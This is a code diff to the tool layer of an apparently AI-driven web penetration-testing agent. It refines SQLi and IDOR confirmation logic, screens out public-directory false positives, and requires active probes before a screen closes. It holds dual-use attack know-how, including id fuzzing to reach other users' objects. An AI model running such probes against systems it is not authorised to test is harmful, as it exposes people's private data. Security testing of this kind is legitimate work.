+            return txt("REJECTED: cited SQLi evidence is HTML/text length (search/result-page variance), not a JSON/XML boolean differential, a SQL error, or TIME-BASED BLIND SQLi CONFIRMED. That is the Drupal/marketing-search false positive — do NOT confirm. Re-run probe_sqli and record only if it returns SQLi CONFIRMED.");
+          if ((category === "idor" || category === "idor-write") && posRecs.every((r) => classifyCrossUserBody(r!.response.body).class === "public-directory"))
+            return txt("REJECTED: cited bodies are a PUBLIC DIRECTORY (tenant people-picker, or a store/location/dealer locator — og:type place, Find a Station, sequential store ids). Typically intended, not IDOR. Do not confirm. Mark idor tested-clean unless the body also has a person's phone/home address/SSN/DOB, another tenant's private object, or order/hold/document contents.");
+          // IDOR proven by cross-user CONTENT, not length: if every positive carries real cross-user data (sensitive-pii /
+          // private-object) that the control does not, a SMALL victim object (e.g. 30B vs a 13B denial, |Δ|<64) is still a
+          // real finding — the leaked content is the proof. Bypass the body-length gate for this content-proven case only.
+          const idorContentProven =
+            (category === "idor" || category === "idor-write") &&
+            posRecs.every((r) => {
+              const cl = classifyCrossUserBody(r!.response.body).class;
+              return cl === "sensitive-pii" || cl === "private-object";
+            }) &&
+            !["sensitive-pii", "private-object"].includes(classifyCrossUserBody(negRec.response.body).class);
+          if (!idorContentProven) {
+            const verdict = checkEvidenceDiscipline(
+              { status: negRec.response.status, bodyLen: negRec.response.body.length },
+              posRecs.map((r) => ({ status: r!.response.status, bodyLen: r!.response.body.length })),
+            );
+            if (!verdict.ok)
+              return txt(`REJECTED (evidence discipline): ${verdict.reason}. Get a negative control that fails + >=2 stable positive replays, then record.`);
+          }
         }
         const evidenceIds = [...new Set([negativeControl, ...positiveReplays])];
         return txt(await commit("confirmed", evidenceIds));
@@ -3619,6 +3953,18 @@ export function buildTools(s: PilotSession) {
         const planned = plannedClassesFor(s.plans.get(s.currentScreenId ?? ""));
         const gate = checkScreenCoverage(planned, coverage ?? [], s.screenProbes);
         if (!gate.ok) return txt(`NOT DONE — ${gate.reason}`);
+        // Input-surface floor: a screen the plan left with NO active class (hygiene-only plan) but that actually carries
+        // a form/params/API must still get >=1 ACTIVE probe before closing — otherwise "static-looking" postback pages
+        // (ASP.NET/SharePoint forms) close on header checks alone and their real surface is never attacked. screenProbes
+        // counts active probes only (probe_headers is active:false), so ===0 here means "mapped but never attacked".
+        // Truly static leaves (no params/apis) stay exempt; skip_screen is the escape hatch for a genuinely untestable one.
+        if (planned.length === 0 && s.screenProbes === 0) {
+          const sc = s.inv.screens().find((x) => x.screenId === s.currentScreenId);
+          if (sc && (sc.params.length > 0 || sc.apis.length > 0))
+            return txt(
+              `NOT DONE — ${s.currentScreenId} carries ${sc.params.length} parameter(s) / ${sc.apis.length} API(s) but only passive/header checks ran (no active probe fired). Attack its input with at least one real probe (probe_params / probe_sqli / probe_ssrf / probe_idor / probe_redirect, or http_request with a crafted value) before closing — or skip_screen with a concrete reason if it genuinely has no testable surface.`,
+            );
+        }
         // screenVerdict は record_finding が維持する(commit、upgrade-only)。モデルの自己申告 verdict では上書きしない
         //   — 記録された実体(confirmed/suspected/無し)が screen status の権威。verdict はログ/返却にのみ使う。
         s.screenDone = true;
@@ -3968,7 +4314,7 @@ export function buildTools(s: PilotSession) {
 
     tool(
       "probe_idor",
-      "Confirm IDOR / BOLA mechanically. As YOUR current session, try to reach ANOTHER user's object. BEST DEFAULT: OMIT param/header/{{ID}} and the tool SWEEPS every id-bearing field on the current screen — each in its OWN location (query/body/header/path), seeded from its observed value + real other-user ids seen elsewhere (knownObjectIds). This is the fix for 'IDOR filed suspected because only one param was tried': one call now covers ALL id fields, so you can't miss the hole by naming the wrong param. `selfId` = an id you legitimately own (OPTIONAL in sweep mode — taken per-field from the inventory). `victimId` = another user's id — OPTIONAL: omit to FUZZ neighbouring ids (selfId±1, ±2, low/seed 1/2/1000) and auto-discover another user's object with no second account. To test ONE specific field, pin it: a {{ID}} placeholder in url/body, `param` (query), or `header` (X-User-Id-style BOLA). Sends a NON-EXISTENT id (negative control — must 404/deny), then the victim/neighbour id (2nd stable replay once it looks real); confirms ONLY on cross-user data present (not your own, not the 404 template) and stable. Opaque uuid/hash ids can't be enumerated → get a real victim id. On a sweep that finds a POPULATED-but-unprovable object it tells you (that is the ONLY case where verdict:suspected is legitimate — a real observed anomaly); otherwise it reports CLEAN. Returns negativeControl + positiveReplays evidenceIds + cross-user impact → record_finding(category idor, or idor-write for a mutating method).",
+      "Confirm IDOR / BOLA mechanically. As YOUR current session, try to reach ANOTHER user's object. BEST DEFAULT: OMIT param/header/{{ID}} and the tool SWEEPS every id-bearing field on the current screen — each in its OWN location (query/body/header/path), seeded from its observed value + real other-user ids seen elsewhere (knownObjectIds). This is the fix for 'IDOR filed suspected because only one param was tried': one call now covers ALL id fields, so you can't miss the hole by naming the wrong param. `selfId` = an id you legitimately own (OPTIONAL in sweep mode — taken per-field from the inventory). `victimId` = another user's id — OPTIONAL: omit to FUZZ neighbouring ids (selfId±1, ±2, low/seed 1/2/1000) and auto-discover another user's object with no second account. To test ONE specific field, pin it: a {{ID}} placeholder in url/body, `param` (query), or `header` (X-User-Id-style BOLA). Sends a NON-EXISTENT id (negative control — must 404/deny), then the victim/neighbour id (2nd stable replay once it looks real); confirms ONLY on cross-user PRIVATE data (email/phone/address/extra internal id, or order/basket/message contents — NOT a tenant people-picker/profile directory (displayName + work email + photo + tenant is typically intended)) and stable. Opaque uuid/hash ids can't be enumerated → get a real victim id. On a sweep that finds a POPULATED-but-unprovable PRIVATE object it tells you (that is the ONLY case where verdict:suspected is legitimate — a real observed anomaly); a public profile card is CLEAN, not suspected. Returns negativeControl + positiveReplays evidenceIds + cross-user impact → record_finding(category idor, or idor-write for a mutating method).",
       { url: z.string(), selfId: z.string().optional(), victimId: z.string().optional(), param: z.string().optional(), header: z.string().optional(), method: z.string().optional(), body: z.string().optional() },
       async ({ url, selfId, victimId, param, header, method, body }) => {
         type PlaceLoc = IdParamLoc | { via: "body-ph" } | { via: "url-ph" };
@@ -4027,7 +4373,11 @@ export function buildTools(s: PilotSession) {
           if (!p1) return null;
           const accessible = p1.status < 400;
           const impact = impactOracle(p1.body, { requestedIdentity: vid, sessionIdentity: self, baselineBody: ctrl.body });
-          const crossUser = impact.some((i) => i.kind === "cross-user") || (identityAppears(p1.body, vid) && !identityAppears(p1.body, self));
+          const bodyClass = classifyCrossUserBody(p1.body, vid);
+          // Trust the oracle (victim id + not a public-directory card). Do not fall back to a bare identityAppears —
+          // that is what confirmed display-name-only profiles as IDOR.
+          const crossUser = impact.some((i) => i.kind === "cross-user");
+          const publicDirectory = bodyClass.class === "public-directory" && identityAppears(p1.body, vid) && (!self || !identityAppears(p1.body, self));
           const controlDenied = ctrl.status >= 400 || Math.abs(ctrl.len - p1.len) > 64 || !ctrl.body.includes(vid);
           let p2: Sent | null = null;
           let stable = false;
@@ -4035,7 +4385,7 @@ export function buildTools(s: PilotSession) {
             p2 = await send(vid, "positive_replay", `${label} #2`, loc);
             stable = !!p2 && Math.abs(p1.len - p2.len) <= 64 && p1.status === p2.status;
           }
-          return { vid, p1, p2, confirmed: accessible && crossUser && controlDenied && stable, accessible, crossUser, controlDenied, stable, impact };
+          return { vid, p1, p2, confirmed: accessible && crossUser && controlDenied && stable, accessible, crossUser, publicDirectory, controlDenied, stable, impact, bodyClass: bodyClass.class };
         };
         const cat = (method ?? "GET").toUpperCase() === "GET" ? "idor" : "idor-write";
         // Where the caller pinned the id (single-field mode). null → SWEEP every id-bearing field on the screen.
@@ -4068,7 +4418,9 @@ export function buildTools(s: PilotSession) {
                   : !r.accessible
                     ? `not IDOR: the victim object returned ${r.p1.status} (access control appears to hold).`
                     : !r.crossUser
-                      ? `not confirmed: got ${r.p1.status} but the body does not carry victim ${victimId}'s data (may be your own object, a template, or a catch-all) — verify the id is really another user's.`
+                      ? r.publicDirectory
+                        ? `not IDOR: this looks like a PUBLIC DIRECTORY (${r.bodyClass} — people-picker or store/location locator for ${victimId}). Typically intended — do not record_finding(idor). Mark idor tested-clean. Confirm only if the body also has a person's phone/home address/SSN/DOB, another tenant's data, or a private object (order/hold/document).`
+                        : `not confirmed: got ${r.p1.status} but the body does not carry victim ${victimId}'s data (may be your own object, a template, or a catch-all) — verify the id is really another user's.`
                       : !r.controlDenied
                         ? `not confirmed: a NON-EXISTENT id returned the same thing — this endpoint is a catch-all (returns 200 for any id), so a 200 for the victim id proves nothing.`
                         : `not confirmed: victim replays were unstable.`,
@@ -4085,11 +4437,11 @@ export function buildTools(s: PilotSession) {
               );
             const ctrl = await send(nonexistentIdLike(selfId), "negative_control", "non-existent id", explicitLoc);
             if (!ctrl) return txt("ERROR: could not place the id — pass a {{ID}} in url/body, or a param, or a header.");
-            const tried: Array<{ id: string; status: number; len: number; crossUser: boolean }> = [];
+            const tried: Array<{ id: string; status: number; len: number; crossUser: boolean; publicDirectory: boolean }> = [];
             for (const vid of candidates) {
               const r = await evalVictim(vid, ctrl, `neighbour ${vid}`, explicitLoc, selfId);
               if (!r) continue;
-              tried.push({ id: vid, status: r.p1.status, len: r.p1.len, crossUser: r.crossUser });
+              tried.push({ id: vid, status: r.p1.status, len: r.p1.len, crossUser: r.crossUser, publicDirectory: r.publicDirectory });
               if (r.confirmed)
                 return txt(
                   JSON.stringify({
@@ -4104,14 +4456,18 @@ export function buildTools(s: PilotSession) {
                 );
             }
             const distinct = tried.filter((t) => t.status < 400 && Math.abs(t.len - ctrl.len) > 64);
+            const directoryHits = distinct.filter((t) => t.publicDirectory);
+            const otherHits = distinct.filter((t) => !t.publicDirectory);
             return txt(
               JSON.stringify({
                 mode: "enumerate",
                 triedIds: candidates,
                 observed: tried,
-                verdict: distinct.length
-                  ? `not confirmed by fuzzing: ${distinct.length} neighbour id(s) (${distinct.map((t) => t.id).join(", ")}) returned a populated 200 but cross-user OWNERSHIP couldn't be auto-proven (the body didn't clearly carry another user's identity). If these are plausibly other users' objects, record verdict:"suspected" citing one of these evidenceIds, or log in as a second role to get a real victim id and re-run.`
-                  : `not confirmed by fuzzing: no neighbour id (${candidates.join(", ")}) returned another user's object — access control appears to hold, or these ids don't map to other users.${ctrl.status < 400 ? " NOTE: the non-existent control also returned 200 → this endpoint may be a catch-all, so id-based tests are inconclusive here." : ""}`,
+                verdict: otherHits.length
+                  ? `not confirmed by fuzzing: ${otherHits.length} neighbour id(s) (${otherHits.map((t) => t.id).join(", ")}) returned a populated 200 but cross-user OWNERSHIP couldn't be auto-proven (the body didn't clearly carry another user's identity). If these are plausibly other users' PRIVATE objects, record verdict:"suspected" citing one of these evidenceIds, or log in as a second role to get a real victim id and re-run.`
+                  : directoryHits.length
+                    ? `not IDOR: neighbour id(s) (${directoryHits.map((t) => t.id).join(", ")}) returned a PUBLIC DIRECTORY (people-picker or store/location locator — not a person's private object). Typically intended — do not record_finding(idor). Mark idor tested-clean.`
+                    : `not confirmed by fuzzing: no neighbour id (${candidates.join(", ")}) returned another user's object — access control appears to hold, or these ids don't map to other users.${ctrl.status < 400 ? " NOTE: the non-existent control also returned 200 → this endpoint may be a catch-all, so id-based tests are inconclusive here." : ""}`,
               }),
             );
           }
@@ -4125,7 +4481,7 @@ export function buildTools(s: PilotSession) {
             );
           const known = knownObjectIds(s);
           const victimsFor = (name: string): string[] => known.filter((k) => k.startsWith(`${name}=`)).map((k) => k.slice(name.length + 1)).slice(0, 4);
-          const swept: Array<{ param: string; via: string; control?: string; tried: string[]; populated: Array<{ id: string; evId: string; status: number }> }> = [];
+          const swept: Array<{ param: string; via: string; control?: string; tried: string[]; populated: Array<{ id: string; evId: string; status: number }>; directory?: boolean }> = [];
           for (const f of fields) {
             const self = f.example;
             const victims = [...(victimId ? [victimId] : []), ...victimsFor(f.name)];
@@ -4140,6 +4496,7 @@ export function buildTools(s: PilotSession) {
               continue;
             }
             const populated: Array<{ id: string; evId: string; status: number }> = [];
+            let directory = false;
             for (const vid of candidates) {
               const r = await evalVictim(vid, ctrl, `${f.name}=${vid}`, f.loc, self);
               if (!r) continue;
@@ -4154,23 +4511,27 @@ export function buildTools(s: PilotSession) {
                     negativeControl: ctrl.evId,
                     positiveReplays: [r.p1.evId, ...(r.p2 ? [r.p2.evId] : [])],
                     ...(r.impact.length ? { impact: r.impact.map((i) => ({ kind: i.kind, marker: i.marker })) } : {}),
-                    verdict: `IDOR/BOLA CONFIRMED by sweep — the '${f.name}' ${f.loc.via} field is object-scoped: id ${vid} returned another user's object (status ${r.p1.status}, cross-user data) while a non-existent id was denied (control ${ctrl.status}). record_finding(category ${cat}) with these evidenceIds.`,
+                    verdict: `IDOR/BOLA CONFIRMED by sweep — the '${f.name}' ${f.loc.via} field is object-scoped: id ${vid} returned another user's object (status ${r.p1.status}, cross-user data present) while a non-existent id was denied (control ${ctrl.status}). record_finding(category ${cat}) with these evidenceIds.`,
                   }),
                 );
-              if (r.p1.status < 400 && Math.abs(r.p1.len - ctrl.len) > 64) populated.push({ id: vid, evId: r.p1.evId, status: r.p1.status });
+              if (r.publicDirectory) directory = true;
+              else if (r.p1.status < 400 && Math.abs(r.p1.len - ctrl.len) > 64) populated.push({ id: vid, evId: r.p1.evId, status: r.p1.status });
             }
-            swept.push({ param: f.name, via: f.loc.via, control: ctrl.evId, tried: candidates, populated });
+            swept.push({ param: f.name, via: f.loc.via, control: ctrl.evId, tried: candidates, populated, ...(directory ? { directory: true } : {}) });
           }
           const anyPopulated = swept.filter((x) => x.populated.length > 0);
           const lead = anyPopulated[0];
+          const directoryOnly = !lead && swept.some((x) => x.directory);
           return txt(
             JSON.stringify({
               mode: "sweep",
               sweptFields: swept.map((x) => `${x.param}(${x.via})`),
               observed: swept,
               verdict: lead
-                ? `not auto-confirmed, but ${anyPopulated.length} id field(s) (${anyPopulated.map((x) => x.param).join(", ")}) returned a POPULATED object for a neighbour id while a non-existent id was denied — a real cross-user anomaly whose ownership couldn't be auto-proven. If plausibly another user's object, record verdict:"suspected" with negativeControl:"${lead.control}" + observation:"${lead.populated[0]!.evId}" (that control-vs-observation pair IS the observed differential the suspected gate requires); or log in as a second role for a real victim id and re-run.`
-                : `CLEAN (id-scoping holds): swept ${swept.length} id-bearing field(s) [${swept.map((x) => `${x.param}(${x.via})`).join(", ")}] with neighbour + known-object ids; none returned another user's object and non-existent controls were denied. Mark idor tested-clean for this screen.`,
+                ? `not auto-confirmed, but ${anyPopulated.length} id field(s) (${anyPopulated.map((x) => x.param).join(", ")}) returned a POPULATED object for a neighbour id while a non-existent id was denied — a real cross-user anomaly whose ownership couldn't be auto-proven. If plausibly another user's PRIVATE object (not just a public display-name card), record verdict:"suspected" with negativeControl:"${lead.control}" + observation:"${lead.populated[0]!.evId}" (that control-vs-observation pair IS the observed differential the suspected gate requires); or log in as a second role for a real victim id and re-run.`
+                : directoryOnly
+                  ? `not IDOR: swept id fields returned a PUBLIC DIRECTORY (people-picker or store/location locator). Typically intended — mark idor tested-clean.`
+                  : `CLEAN (id-scoping holds): swept ${swept.length} id-bearing field(s) [${swept.map((x) => `${x.param}(${x.via})`).join(", ")}] with neighbour + known-object ids; none returned another user's object and non-existent controls were denied. Mark idor tested-clean for this screen.`,
             }),
           );
         } catch (e) {
